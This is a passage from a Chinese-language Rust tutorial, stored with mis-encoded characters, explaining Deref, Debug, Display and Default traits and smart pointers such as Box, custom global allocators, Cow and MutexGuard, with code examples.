Derefï¼Œä¹Ÿå¯ä»¥ä¸ºè‡ªå·±çš„æ•°æ®ç»“æ„å®ç° Derefã€‚ å¯¹äºæ™®é€šçš„å¼•ç”¨ï¼Œè§£å¼•ç”¨å¾ˆç›´è§‚ï¼Œå› ä¸ºå®ƒåªæœ‰ä¸€ä¸ªæŒ‡å‘å€¼çš„åœ°å€ï¼Œä»è¿™ä¸ªåœ°å€å¯ä»¥è·å–åˆ°æ‰€éœ€è¦çš„å€¼ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š 1234let mut x = 42;let y = &amp;mut x;// è§£å¼•ç”¨ï¼Œå†…éƒ¨è°ƒç”¨ DerefMutï¼ˆå…¶å®ç°å°±æ˜¯ *selfï¼‰*y += 1; ä½†å¯¹æ™ºèƒ½æŒ‡é’ˆæ¥è¯´ï¼Œæ‹¿ä»€ä¹ˆåŸŸæ¥è§£å¼•ç”¨å°±ä¸é‚£ä¹ˆç›´è§‚äº†ï¼Œæ¥çœ‹ä¹‹å‰å­¦è¿‡çš„ Rc æ˜¯æ€ä¹ˆå®ç° Deref çš„ï¼š 1234567impl&lt;T: ?Sized&gt; Deref for Rc&lt;T&gt; &#123; type Target = T; fn deref(&amp;self) -&gt; &amp;T &#123; &amp;self.inner().value &#125;&#125; å¯ä»¥çœ‹åˆ°ï¼Œå®ƒæœ€ç»ˆæŒ‡å‘äº†å †ä¸Šçš„ RcBox å†…éƒ¨çš„ value çš„åœ°å€ï¼Œç„¶åå¦‚æœå¯¹å…¶è§£å¼•ç”¨çš„è¯ï¼Œå¾—åˆ°äº† value å¯¹åº”çš„å€¼ã€‚ 1234567891011121314151617181920212223242526272829303132use std::ops::&#123;Deref, DerefMut&#125;;#[derive(Debug)]struct Buffer&lt;T&gt;(Vec&lt;T&gt;);impl&lt;T&gt; Buffer&lt;T&gt; &#123; pub fn new(v: impl Into&lt;Vec&lt;T&gt;&gt;) -&gt; Self &#123; Self(v.into()) &#125;&#125;impl&lt;T&gt; Deref for Buffer&lt;T&gt; &#123; type Target = [T]; fn deref(&amp;self) -&gt; &amp;Self::Target &#123; &amp;self.0 &#125;&#125;impl&lt;T&gt; DerefMut for Buffer&lt;T&gt; &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut Self::Target &#123; &amp;mut self.0 &#125;&#125;fn main() &#123; let mut buf = Buffer::new([1, 3, 2, 4]); // å› ä¸ºå®ç°äº† Deref å’Œ DerefMutï¼Œè¿™é‡Œ buf å¯ä»¥ç›´æ¥è®¿é—® Vec&lt;T&gt; çš„æ–¹æ³• // ä¸‹é¢è¿™å¥ç›¸å½“äºï¼š(&amp;mut buf).deref_mut().sort()ï¼Œä¹Ÿå°±æ˜¯ (&amp;mut buf.0).sort() buf.sort(); println!(\"buf: &#123;:?&#125;\", buf);&#125; å®ç° Deref å’Œ DerefMutï¼Œè¿™æ ·åœ¨è§£å¼•ç”¨çš„æ—¶å€™ï¼Œç›´æ¥è®¿é—®åˆ° buf.0ï¼Œçœå»äº†ä»£ç çš„å•°å—¦å’Œæ•°æ®ç»“æ„å†…éƒ¨å­—æ®µçš„éšè—ã€‚ å…¶å®ƒ: Debug å…ˆçœ‹ Debug / Displayï¼Œå®ƒä»¬çš„å®šä¹‰å¦‚ä¸‹ï¼š 1234567pub trait Debug &#123; fn fmt(&amp;self, f: &amp;mut Formatter&lt;'_&gt;) -&gt; Result&lt;(), Error&gt;;&#125;pub trait Display &#123; fn fmt(&amp;self, f: &amp;mut Formatter&lt;'_&gt;) -&gt; Result&lt;(), Error&gt;;&#125; å¯ä»¥çœ‹åˆ°ï¼ŒDebug å’Œ Display ä¸¤ä¸ª trait çš„ç­¾åä¸€æ ·ï¼Œéƒ½æ¥å—ä¸€ä¸ª &amp;self å’Œä¸€ä¸ª &amp;mut Formatterã€‚ Debug æ˜¯ä¸ºå¼€å‘è€…è°ƒè¯•æ‰“å°æ•°æ®ç»“æ„æ‰€è®¾è®¡çš„ï¼Œè€Œ Display æ˜¯ç»™ç”¨æˆ·æ˜¾ç¤ºæ•°æ®ç»“æ„æ‰€è®¾è®¡çš„ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ Debug trait çš„å®ç°å¯ä»¥é€šè¿‡æ´¾ç”Ÿå®ç›´æ¥ç”Ÿæˆï¼Œè€Œ Display å¿…é¡»æ‰‹å·¥å®ç°ã€‚åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼ŒDebug ç”¨ {:?} æ¥æ‰“å°ï¼ŒDisplay ç”¨ {} æ‰“å°ã€‚ æœ€åçœ‹ Default traitã€‚å®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š 123pub trait Default &#123; fn default() -&gt; Self;&#125; Default trait ç”¨äºä¸ºç±»å‹æä¾›ç¼ºçœå€¼ã€‚å®ƒä¹Ÿå¯ä»¥é€šè¿‡ derive å® #[derive(Default)] æ¥ç”Ÿæˆå®ç°ï¼Œå‰ææ˜¯ç±»å‹ä¸­çš„æ¯ä¸ªå­—æ®µéƒ½å®ç°äº† Default traitã€‚åœ¨åˆå§‹åŒ–ä¸€ä¸ªæ•°æ®ç»“æ„æ—¶ï¼Œå¯ä»¥éƒ¨åˆ†åˆå§‹åŒ–ï¼Œç„¶åå‰©ä½™çš„éƒ¨åˆ†ä½¿ç”¨ Default::default()ã€‚ Debug/Display/Default å¦‚ä½•ä½¿ç”¨ï¼Œç»Ÿä¸€çœ‹ä¸ªä¾‹å­ï¼ˆä»£ç ï¼‰ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455use std::fmt;// struct å¯ä»¥ derive Defaultï¼Œä½†éœ€è¦æ‰€æœ‰å­—æ®µéƒ½å®ç°äº† Default#[derive(Clone, Debug, Default)]struct Developer &#123; name: String, age: u8, lang: Language,&#125;// enum ä¸èƒ½ derive Default#[allow(dead_code)]#[derive(Clone, Debug)]enum Language &#123; Rust, TypeScript, Elixir, Haskell,&#125;// æ‰‹å·¥å®ç° Defaultimpl Default for Language &#123; fn default() -&gt; Self &#123; Language::Rust &#125;&#125;impl Developer &#123; pub fn new(name: &amp;str) -&gt; Self &#123; // ç”¨ ..Default::default() ä¸ºå‰©ä½™å­—æ®µä½¿ç”¨ç¼ºçœå€¼ Self &#123; name: name.to_owned(), ..Default::default() &#125; &#125;&#125;impl fmt::Display for Developer &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; write!( f, \"&#123;&#125;(&#123;&#125; years old): &#123;:?&#125; developer\", self.name, self.age, self.lang ) &#125;&#125;fn main() &#123; // ä½¿ç”¨ T::default() let dev1 = Developer::default(); // ä½¿ç”¨ Default::default()ï¼Œä½†æ­¤æ—¶ç±»å‹æ— æ³•é€šè¿‡ä¸Šä¸‹æ–‡æ¨æ–­ï¼Œéœ€è¦æä¾›ç±»å‹ let dev2: Developer = Default::default(); // ä½¿ç”¨ T::new let dev3 = Developer::new(\"Tyr\"); println!(\"dev1: &#123;&#125;\\\\ndev2: &#123;&#125;\\\\ndev3: &#123;:?&#125;\", dev1, dev2, dev3);&#125; åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼Œå»¶è¿Ÿç»‘å®šä¼šå¸¦æ¥æå¤§çš„çµæ´»æ€§ã€‚ ä»æ•°æ®çš„è§’åº¦çœ‹ï¼Œæ•°æ®ç»“æ„æ˜¯å…·ä½“æ•°æ®çš„å»¶è¿Ÿç»‘å®šï¼Œæ³›å‹ç»“æ„æ˜¯å…·ä½“æ•°æ®ç»“æ„çš„å»¶è¿Ÿç»‘å®šï¼›ä»ä»£ç çš„è§’åº¦çœ‹ï¼Œå‡½æ•°æ˜¯ä¸€ç»„å®ç°æŸä¸ªåŠŸèƒ½çš„è¡¨è¾¾å¼çš„å»¶è¿Ÿç»‘å®šï¼Œæ³›å‹å‡½æ•°æ˜¯å‡½æ•°çš„å»¶è¿Ÿç»‘å®šã€‚é‚£ä¹ˆ trait æ˜¯ä»€ä¹ˆçš„å»¶è¿Ÿç»‘å®šå‘¢ï¼Ÿ trait æ˜¯è¡Œä¸ºçš„å»¶è¿Ÿç»‘å®šã€‚å¯ä»¥åœ¨ä¸çŸ¥é“å…·ä½“è¦å¤„ç†ä»€ä¹ˆæ•°æ®ç»“æ„çš„å‰æä¸‹ï¼Œå…ˆé€šè¿‡ trait æŠŠç³»ç»Ÿçš„å¾ˆå¤šè¡Œä¸ºçº¦å®šå¥½ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¼€å¤´è§£é‡Šæ ‡å‡†traitæ—¶ï¼Œé¢‘ç¹ç”¨åˆ°äº†â€œçº¦å®šâ€¦â€¦è¡Œä¸ºâ€ã€‚ æ™ºèƒ½æŒ‡é’ˆ æŒ‡é’ˆæ˜¯ä¸€ä¸ªæŒæœ‰å†…å­˜åœ°å€çš„å€¼ï¼Œå¯ä»¥é€šè¿‡è§£å¼•ç”¨æ¥è®¿é—®å®ƒæŒ‡å‘çš„å†…å­˜åœ°å€ï¼Œç†è®ºä¸Šå¯ä»¥è§£å¼•ç”¨åˆ°ä»»æ„æ•°æ®ç±»å‹ï¼›å¼•ç”¨æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æŒ‡é’ˆï¼Œå®ƒçš„è§£å¼•ç”¨è®¿é—®æ˜¯å—é™çš„ï¼Œåªèƒ½è§£å¼•ç”¨åˆ°å®ƒå¼•ç”¨æ•°æ®çš„ç±»å‹ã€‚ æ™ºèƒ½æŒ‡é’ˆæ˜¯ä¸€ä¸ªè¡¨ç°è¡Œä¸ºå¾ˆåƒæŒ‡é’ˆçš„æ•°æ®ç»“æ„ï¼Œä½†é™¤äº†æŒ‡å‘æ•°æ®çš„æŒ‡é’ˆå¤–ï¼Œå®ƒè¿˜æœ‰å…ƒæ•°æ®ä»¥æä¾›é¢å¤–çš„å¤„ç†èƒ½åŠ›ã€‚ åœ¨ Rust ä¸­ï¼Œå‡¡æ˜¯éœ€è¦åšèµ„æºå›æ”¶çš„æ•°æ®ç»“æ„ï¼Œä¸”å®ç°äº† Deref/DerefMut/Dropï¼Œéƒ½æ˜¯æ™ºèƒ½æŒ‡é’ˆã€‚ ç”¨äºåœ¨å †ä¸Šåˆ†é…å†…å­˜çš„ Box å’Œ Vecã€ç”¨äºå¼•ç”¨è®¡æ•°çš„ Rc å’Œ Arc ã€‚å¾ˆå¤šå…¶ä»–æ•°æ®ç»“æ„ï¼Œå¦‚ PathBufã€Cow&lt;'a, B&gt;ã€MutexGuardã€RwLockReadGuard å’Œ RwLockWriteGuard ç­‰ä¹Ÿæ˜¯æ™ºèƒ½æŒ‡é’ˆã€‚ String æ˜¯ç”¨ç»“æ„ä½“å®šä¹‰çš„ï¼š 1234567891011121314151617181920212223242526272829pub struct String &#123; vec: Vec&lt;u8&gt;,&#125;impl ops::Deref for String &#123; type Target = str; fn deref(&amp;self) -&gt; &amp;str &#123; unsafe &#123; str::from_utf8_unchecked(&amp;self.vec) &#125; &#125;&#125;impl ops::DerefMut for String &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut str &#123; unsafe &#123; str::from_utf8_unchecked_mut(&amp;mut *self.vec) &#125; &#125;&#125;unsafe impl&lt;#[may_dangle] T, A: Allocator&gt; Drop for Vec&lt;T, A&gt; &#123; fn drop(&amp;mut self) &#123; unsafe &#123; // use drop for [T] // use a raw slice to refer to the elements of the vector as weakest necessary type; // could avoid questions of validity in certain cases ptr::drop_in_place(ptr::slice_from_raw_parts_mut(self.as_mut_ptr(), self.len)) &#125; // RawVec handles deallocation &#125;&#125; Box Rust ä¸­æœ€åŸºæœ¬çš„åœ¨å †ä¸Šåˆ†é…å†…å­˜çš„æ–¹å¼ã€‚ Box çš„å®šä¹‰é‡Œï¼Œå†…éƒ¨æ˜¯ä¸€ä¸ª Unique ç”¨äºè‡´æ•¬ C++ï¼ŒUnique æ˜¯ä¸€ä¸ªç§æœ‰çš„æ•°æ®ç»“æ„ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå®ƒåŒ…è£¹äº†ä¸€ä¸ª *const T æŒ‡é’ˆï¼Œå¹¶å”¯ä¸€æ‹¥æœ‰è¿™ä¸ªæŒ‡é’ˆã€‚ 123456789pub struct Unique&lt;T: ?Sized&gt; &#123; pointer: *const T, // NOTE: this marker has no consequences for variance, but is necessary // for dropck to understand that we logically own a `T`. // // For details, see: // https://github.com/rust-lang/rfcs/blob/master/text/0769-sound-generic-drop.md#phantom-data _marker: PhantomData&lt;T&gt;,&#125; åœ¨å †ä¸Šåˆ†é…å†…å­˜ï¼Œéœ€è¦ä½¿ç”¨å†…å­˜åˆ†é…å™¨ï¼ˆAllocatorï¼‰ã€‚è®¾è®¡å†…å­˜åˆ†é…å™¨çš„ç›®çš„é™¤äº†ä¿è¯æ­£ç¡®æ€§ä¹‹å¤–ï¼Œå°±æ˜¯ä¸ºäº†æœ‰æ•ˆåœ°åˆ©ç”¨å‰©ä½™å†…å­˜ï¼Œå¹¶æ§åˆ¶å†…å­˜åœ¨åˆ†é…å’Œé‡Šæ”¾è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ç¢ç‰‡çš„æ•°é‡ã€‚ å †ä¸Šåˆ†é…å†…å­˜çš„ Box å…¶å®æœ‰ä¸€ä¸ªç¼ºçœçš„æ³›å‹å‚æ•° Aï¼Œå°±éœ€è¦æ»¡è¶³ Allocator traitï¼Œå¹¶ä¸”é»˜è®¤æ˜¯ Globalï¼š 1pub struct Box&lt;T: ?Sized,A: Allocator = Global&gt;(Unique&lt;T&gt;, A) Allocator trait æä¾›å¾ˆå¤šæ–¹æ³•ï¼š allocateæ˜¯ä¸»è¦æ–¹æ³•ï¼Œç”¨äºåˆ†é…å†…å­˜ï¼Œå¯¹åº” C çš„ malloc/callocï¼› deallocateï¼Œç”¨äºé‡Šæ”¾å†…å­˜ï¼Œå¯¹åº” C çš„ freeï¼› è¿˜æœ‰ grow / shrinkï¼Œç”¨æ¥æ‰©å¤§æˆ–ç¼©å°å †ä¸Šå·²åˆ†é…çš„å†…å­˜ï¼Œå¯¹åº” C çš„ reallocã€‚ æ›¿æ¢é»˜è®¤çš„å†…å­˜åˆ†é…å™¨ï¼Œå¯ä»¥ä½¿ç”¨ #[global_allocator] æ ‡è®°å®ï¼Œå®šä¹‰ä½ è‡ªå·±çš„å…¨å±€åˆ†é…å™¨ã€‚ä¸‹é¢çš„ä»£ç å±•ç¤ºäº†å¦‚ä½•åœ¨ Rust ä¸‹ä½¿ç”¨ jemallocï¼š 123456use jemallocator::Jemalloc;#[global_allocator]static GLOBAL: Jemalloc = Jemalloc;fn main() &#123;&#125; è¿™æ ·è®¾ç½®ä¹‹åï¼Œä½¿ç”¨ Box::new() åˆ†é…çš„å†…å­˜å°±æ˜¯ jemalloc åˆ†é…å‡ºæ¥çš„äº†ã€‚å¦å¤–ï¼Œæ’°å†™è‡ªå·±çš„å…¨å±€åˆ†é…å™¨ï¼Œå¯ä»¥å®ç° GlobalAlloc traitï¼Œå®ƒå’Œ Allocator trait çš„åŒºåˆ«ï¼Œä¸»è¦åœ¨äºæ˜¯å¦å…è®¸åˆ†é…é•¿åº¦ä¸ºé›¶çš„å†…å­˜ã€‚ å¸¸è§çš„é€šç”¨å†…å­˜åˆ†é…å™¨æœ‰ glibc çš„ pthread mallocã€Google å¼€å‘çš„ tcmallocã€FreeBSD ä¸Šé»˜è®¤ä½¿ç”¨çš„ jemalloc ç­‰ã€‚é™¤äº†é€šç”¨å†…å­˜åˆ†é…å™¨ï¼Œå¯¹äºç‰¹å®šç±»å‹å†…å­˜çš„åˆ†é…ï¼Œè¿˜å¯ä»¥ç”¨ slabï¼Œslab ç›¸å½“äºä¸€ä¸ªé¢„åˆ†é…å¥½çš„å¯¹è±¡æ± ï¼Œå¯ä»¥æ‰©å±•å’Œæ”¶ç¼©ã€‚ ç¤ºä¾‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546use std::alloc::&#123;GlobalAlloc, Layout, System&#125;;struct MyAllocator;unsafe impl GlobalAlloc for MyAllocator &#123; unsafe fn alloc(&amp;self, layout: Layout) -&gt; *mut u8 &#123; let data = System.alloc(layout); eprintln!(\"ALLOC: &#123;:p&#125;, size &#123;&#125;\", data, layout.size()); data &#125; unsafe fn dealloc(&amp;self, ptr: *mut u8, layout: Layout) &#123; System.dealloc(ptr, layout); eprintln!(\"FREE: &#123;:p&#125;, size &#123;&#125;\", ptr, layout.size()); &#125;&#125;#[global_allocator]static GLOBAL: MyAllocator = MyAllocator;#[allow(dead_code)]struct Matrix &#123; // ä½¿ç”¨ä¸è§„åˆ™çš„æ•°å­—å¦‚ 505 å¯ä»¥è®© dbg! çš„æ‰“å°å¾ˆå®¹æ˜“åˆ†è¾¨å‡ºæ¥ data: [u8; 505],&#125;impl Default for Matrix &#123; fn default() -&gt; Self &#123; Self &#123; data: [0; 505] &#125; &#125;&#125;fn main() &#123; // åœ¨è¿™å¥æ‰§è¡Œä¹‹å‰å·²ç»æœ‰å¥½å¤šå†…å­˜åˆ†é… let data = Box::new(Matrix::default()); // è¾“å‡ºä¸­æœ‰ä¸€ä¸ª 1024 å¤§å°çš„å†…å­˜åˆ†é…ï¼Œæ˜¯ println! å¯¼è‡´çš„ println!( \"!!! allocated memory: &#123;:p&#125;, len: &#123;&#125;\", &amp;*data, std::mem::size_of::&lt;Matrix&gt;() ); // data åœ¨è¿™é‡Œ dropï¼Œå¯ä»¥åœ¨æ‰“å°ä¸­çœ‹åˆ° FREE // ä¹‹åè¿˜æœ‰å¾ˆå¤šå…¶å®ƒå†…å­˜è¢«é‡Šæ”¾&#125; æ³¨æ„è¿™é‡Œä¸èƒ½ä½¿ç”¨ println!() ã€‚å› ä¸º stdout ä¼šæ‰“å°åˆ°ä¸€ä¸ªç”± Mutex äº’æ–¥é”ä¿æŠ¤çš„å…±äº«å…¨å±€ buffer ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šæ¶‰åŠå†…å­˜çš„åˆ†é…ï¼Œå†è¿è¡Œ println!()ï¼Œæœ€ç»ˆé€ æˆç¨‹åºå´©æºƒã€‚è€Œ eprintln! ç›´æ¥æ‰“å°åˆ° stderrï¼Œä¸ä¼š bufferã€‚ Box::new() æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¼ å…¥å®ƒçš„æ•°æ®ä¼šå‡ºç°åœ¨æ ˆä¸Šï¼Œå†ç§»åŠ¨åˆ°å †ä¸Šã€‚æ‰€ä»¥ï¼Œå¦‚æœçš„ Matrix ç»“æ„ä¸æ˜¯ 505 ä¸ªå­—èŠ‚ï¼Œæ˜¯ä¸€ä¸ªéå¸¸å¤§çš„ç»“æ„ï¼Œå°±æœ‰å¯èƒ½å‡ºç° stack overflow é—®é¢˜ã€‚ å¦‚æœæ˜¯ debug buildï¼Œå®ƒä¸ä¼šåšä»»ä½• inline çš„ä¼˜åŒ–ï¼Œè€Œ Box::new() æ³¨æ˜äº†è¦ inlineï¼Œåœ¨ release æ¨¡å¼ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°è°ƒç”¨ä¼šè¢«ä¼˜åŒ–æ‰ï¼š 12345678#[cfg(not(no_global_oom_handling))]#[inline(always)]#[doc(alias = \"alloc\")]#[doc(alias = \"malloc\")]#[stable(feature = \"rust1\", since = \"1.0.0\")]pub fn new(x: T) -&gt; Self &#123; box x&#125; å¦‚æœä¸ inlineï¼Œæ•´ä¸ª 16M çš„å¤§æ•°ç»„ä¼šé€šè¿‡æ ˆå†…å­˜ä¼ é€’ç»™ Box::newï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚ Box çš„å†…å­˜é‡Šæ”¾å®ç°ï¼š 123456#[stable(feature = \"rust1\", since = \"1.0.0\")]unsafe impl&lt;#[may_dangle] T: ?Sized, A: Allocator&gt; Drop for Box&lt;T, A&gt; &#123; fn drop(&amp;mut self) &#123; // FIXME: Do nothing, drop is currently performed by compiler. &#125;&#125; drop trait ä»€ä¹ˆéƒ½æ²¡æœ‰åšï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ’å…¥ deallocate çš„ä»£ç ã€‚è¿™æ˜¯ Rust è¯­è¨€çš„ä¸€ç§ç­–ç•¥ï¼šåœ¨å…·ä½“å®ç°è¿˜æ²¡æœ‰ç¨³å®šä¸‹æ¥ä¹‹å‰ï¼Œå…ˆæŠŠæ¥å£ç¨³å®šï¼Œå®ç°éšç€ä¹‹åçš„è¿­ä»£æ…¢æ…¢ç¨³å®šã€‚ Cow&lt;'a, B&gt; Cow æ˜¯ Rust ä¸‹ç”¨äºæä¾›å†™æ—¶å…‹éš†ï¼ˆClone-on-Writeï¼‰çš„ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆï¼Œæœ‰ä¸€ä¸ªåªè¯»å€Ÿç”¨ï¼Œä½†å¦‚æœè°ƒç”¨è€…éœ€è¦æ‰€æœ‰æƒæˆ–è€…éœ€è¦ä¿®æ”¹å†…å®¹ï¼Œé‚£ä¹ˆå®ƒä¼š clone å€Ÿç”¨çš„æ•°æ®ã€‚ 1234pub enum Cow&lt;'a, B&gt; where B: 'a + ToOwned + ?Sized &#123; Borrowed(&amp;'a B), Owned(&lt;B as ToOwned&gt;::Owned),&#125; å®ƒæ˜¯ä¸€ä¸ª enumï¼Œå¯ä»¥åŒ…å«ä¸€ä¸ªå¯¹ç±»å‹ B çš„åªè¯»å¼•ç”¨ï¼Œæˆ–è€…åŒ…å«å¯¹ç±»å‹ B çš„æ‹¥æœ‰æ‰€æœ‰æƒçš„æ•°æ®ã€‚ è¿™é‡Œåˆå¼•å…¥äº†ä¸¤ä¸ª traitï¼Œé¦–å…ˆæ˜¯ ToOwnedï¼Œåœ¨ ToOwned trait å®šä¹‰çš„æ—¶å€™ï¼Œåˆå¼•å…¥äº† Borrow traitï¼Œå®ƒä»¬éƒ½æ˜¯ std::borrow ä¸‹çš„ traitï¼š 12345678910111213141516171819202122pub trait ToOwned &#123; type Owned: Borrow&lt;Self&gt;; #[must_use = \"cloning is often expensive and is not expected to have side effects\"] fn to_owned(&amp;self) -&gt; Self::Owned; fn clone_into(&amp;self, target: &amp;mut Self::Owned) &#123; ... &#125;&#125;pub trait Borrow&lt;Borrowed&gt; where Borrowed: ?Sized &#123; fn borrow(&amp;self) -&gt; &amp;Borrowed;&#125;impl&lt;B: ?Sized + ToOwned&gt; Deref for Cow&lt;'_, B&gt; &#123; type Target = B; fn deref(&amp;self) -&gt; &amp;B &#123; match *self &#123; Borrowed(borrowed) =&gt; borrowed, Owned(ref owned) =&gt; owned.borrow(), &#125; &#125;&#125; æ ¹æ® self æ˜¯ Borrowed è¿˜æ˜¯ Ownedï¼Œåˆ†åˆ«å–å…¶å†…å®¹ï¼Œç”Ÿæˆå¼•ç”¨ï¼š å¯¹äº Borrowedï¼Œç›´æ¥å°±æ˜¯å¼•ç”¨ï¼› å¯¹äº Ownedï¼Œè°ƒç”¨å…¶ borrow() æ–¹æ³•ï¼Œè·å¾—å¼•ç”¨ã€‚ æ ¹æ® enum çš„ä¸åŒçŠ¶æ€æ¥è¿›è¡Œç»Ÿä¸€åˆ†å‘çš„æ–¹æ³•æ˜¯ç¬¬ä¸‰ç§åˆ†å‘æ‰‹æ®µï¼Œå¯¹åº”çš„æœ‰ä½¿ç”¨æ³›å‹å‚æ•°åšé™æ€åˆ†å‘å’Œä½¿ç”¨ trait object åšåŠ¨æ€åˆ†å‘ã€‚ ç›¸å¯¹äºæ ˆå†…å­˜çš„åˆ†é…é‡Šæ”¾æ¥è¯´ï¼Œå †å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾æ•ˆç‡è¦ä½å¾ˆå¤šï¼Œå…¶å†…éƒ¨è¿˜æ¶‰åŠç³»ç»Ÿè°ƒç”¨å’Œé”ï¼Œå‡å°‘ä¸å¿…è¦çš„å †å†…å­˜åˆ†é…æ˜¯æå‡ç³»ç»Ÿæ•ˆç‡çš„å…³é”®æ‰‹æ®µã€‚è€Œ Rust çš„ Cow&lt;'a, B&gt;ï¼Œåœ¨å¸®åŠ©ä½ è¾¾æˆè¿™ä¸ªæ•ˆæœçš„åŒæ—¶ï¼Œä½¿ç”¨ä½“éªŒè¿˜éå¸¸ç®€å•èˆ’æœã€‚ ä½¿ç”¨ç¤ºä¾‹ åœ¨è§£æ URL çš„æ—¶å€™ï¼Œéœ€è¦å°† querystring ä¸­çš„å‚æ•°ï¼Œæå–æˆ KV pair æ¥è¿›ä¸€æ­¥ä½¿ç”¨ã€‚ç»å¤§å¤šæ•°è¯­è¨€ä¸­ï¼Œæå–å‡ºæ¥çš„ KV éƒ½æ˜¯æ–°çš„å­—ç¬¦ä¸²ï¼Œåœ¨æ¯ç§’é’Ÿå¤„ç†å‡ å k ç”šè‡³ä¸Šç™¾ k è¯·æ±‚çš„ç³»ç»Ÿä¸­ï¼Œå †å†…å­˜çš„åˆ†é…ä¼šå¾ˆé¢‘ç¹ã€‚ ä½†åœ¨ Rust ä¸­ï¼Œå¯ä»¥ç”¨ Cow ç±»å‹è½»æ¾é«˜æ•ˆå¤„ç†å®ƒï¼Œåœ¨è¯»å– URL çš„è¿‡ç¨‹ä¸­ï¼š æ¯è§£æå‡ºä¸€ä¸ª key æˆ–è€… valueï¼Œå¯ä»¥ç”¨ä¸€ä¸ª &amp;str æŒ‡å‘ URL ä¸­ç›¸åº”çš„ä½ç½®ï¼Œç„¶åç”¨ Cow å°è£…å®ƒï¼› è€Œå½“è§£æå‡ºæ¥çš„å†…å®¹ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦ decode æ—¶ï¼Œæ¯”å¦‚ â€œhello%20worldâ€ï¼Œå¯ä»¥ç”Ÿæˆä¸€ä¸ªè§£æåçš„ Stringï¼ŒåŒæ ·ç”¨ Cow å°è£…å®ƒã€‚ 1234567891011121314151617181920212223242526272829303132333435use std::borrow::Cow;use url::Url;fn main() &#123; let url = Url::parse(\"https://tyr.com/rust?page=1024&amp;sort=desc&amp;extra=hello%20world\").unwrap(); let mut pairs = url.query_pairs(); assert_eq!(pairs.count(), 3); let (mut k, v) = pairs.next().unwrap(); // å› ä¸º k, v éƒ½æ˜¯ Cow&lt;str&gt; ä»–ä»¬ç”¨èµ·æ¥æ„Ÿè§‰å’Œ &amp;str æˆ–è€… String ä¸€æ · // æ­¤åˆ»ï¼Œä»–ä»¬éƒ½æ˜¯ Borrowed println!(\"key: &#123;&#125;, v: &#123;&#125;\", k, v); // å½“ä¿®æ”¹å‘ç”Ÿæ—¶ï¼Œk å˜æˆ Owned k.to_mut().push_str(\"_lala\"); print_pairs((k, v)); print_pairs(pairs.next().unwrap()); // åœ¨å¤„ç† extra=hello%20world æ—¶ï¼Œvalue è¢«å¤„ç†æˆ \"hello world\" // æ‰€ä»¥è¿™é‡Œ value æ˜¯ Owned print_pairs(pairs.next().unwrap());&#125;fn print_pairs(pair: (Cow&lt;str&gt;, Cow&lt;str&gt;)) &#123; println!(\"key: &#123;&#125;, value: &#123;&#125;\", show_cow(pair.0), show_cow(pair.1));&#125;fn show_cow(cow: Cow&lt;str&gt;) -&gt; String &#123; match cow &#123; Cow::Borrowed(v) =&gt; format!(\"Borrowed &#123;&#125;\", v), Cow::Owned(v) =&gt; format!(\"Owned &#123;&#125;\", v), &#125;&#125; åœ¨ Rust æ ‡å‡†åº“å’Œç¬¬ä¸‰æ–¹åº“ä¸­éå¸¸å¸¸è§ã€‚æ¯”å¦‚ Rust ä¸‹è‘—åçš„ serde åº“ï¼Œå¯ä»¥éå¸¸é«˜æ•ˆåœ°å¯¹ Rust æ•°æ®ç»“æ„ï¼Œè¿›è¡Œåºåˆ—åŒ–/ååºåˆ—åŒ–æ“ä½œï¼Œå®ƒå¯¹ Cow å°±æœ‰å¾ˆå¥½çš„æ”¯æŒã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹ä»£ç å°†ä¸€ä¸ª JSON æ•°æ®ååºåˆ—åŒ–æˆ User ç±»å‹ï¼ŒåŒæ—¶è®© User ä¸­çš„ name ä½¿ç”¨ Cow æ¥å¼•ç”¨ JSON æ–‡æœ¬ä¸­çš„å†…å®¹ï¼š 12345678910111213141516171819use std::borrow::Cow;use serde::Deserialize;#[derive(Debug, Deserialize)]struct User&lt;'input&gt; &#123; #[serde(borrow)] name: Cow&lt;'input, str&gt;, age: u8,&#125;fn main() &#123; let input = r#\"&#123; \"name\": \"Tyr\", \"age\": 18 &#125;\"#; let user: User = serde_json::from_str(input).unwrap(); match user.name &#123; Cow::Borrowed(x) =&gt; println!(\"borrowed &#123;&#125;\", x), Cow::Owned(x) =&gt; println!(\"owned &#123;&#125;\", x), &#125;&#125; MutexGuard MutexGuard ä¸ä½†é€šè¿‡ Deref æä¾›è‰¯å¥½çš„ç”¨æˆ·ä½“éªŒï¼Œè¿˜é€šè¿‡ Drop trait æ¥ç¡®ä¿ï¼Œä½¿ç”¨åˆ°çš„å†…å­˜ä»¥å¤–çš„èµ„æºåœ¨é€€å‡ºæ—¶è¿›è¡Œé‡Šæ”¾ã€‚ MutexGuard è¿™ä¸ªç»“æ„æ˜¯åœ¨è°ƒç”¨ Mutex::lock æ—¶ç”Ÿæˆçš„ï¼š 123456pub fn lock(&amp;self) -&gt; LockResult&lt;MutexGuard&lt;'_, T&gt;&gt; &#123; unsafe &#123; self.inner.raw_lock(); MutexGuard::new(self) &#125;&#125; 